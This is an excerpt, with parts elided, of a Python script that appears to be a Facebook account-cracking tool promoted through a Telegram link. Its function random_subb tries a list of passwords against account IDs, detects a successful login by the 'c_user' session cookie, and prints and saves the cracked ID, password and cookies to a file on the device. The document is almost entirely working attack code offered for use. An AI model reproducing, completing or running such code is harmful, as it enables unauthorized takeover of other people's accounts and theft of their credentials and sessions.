...
'--.  .--'/  O  \      |  ||  | |  ||  |    
   ...
   |  |  |  | |  ||  '-'  /'  '-'  '|  '--. 
   `--'  `--' `--' `-----'  `-----' `-----' 
\33[37;42m𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌:https://t.me/appdapeloper\33[0;m"""
...
def random_subb(uid,pwx,fb,fb1):
    ...
    sys.stdout.write(f"\r\033[38;5;46m[RABBI-XD] [{fb1}] {loop}|{str(len(oks))}|0");sys.stdout.flush()
    ...
    try:
        for ps in pwx:
            ...
            if "c_user" in eehhcc:
                ...
                xd="1000"+coki1[0:11]
                print(f"\r\r\033[38;5;46m[TABBI-OK] \033[38;5;47m{xd} | {ps}  \n\033[38;5;46m[COOKIES] \033[38;5;49msb={sort}\n\033[38;5;48m———————————————————————————————————— ")
                open("/sdcard/RABBI-ok.txt","a").write(xd+"|"+ps+"\n")
                oks.append(uid)
                break
            else:
                continue
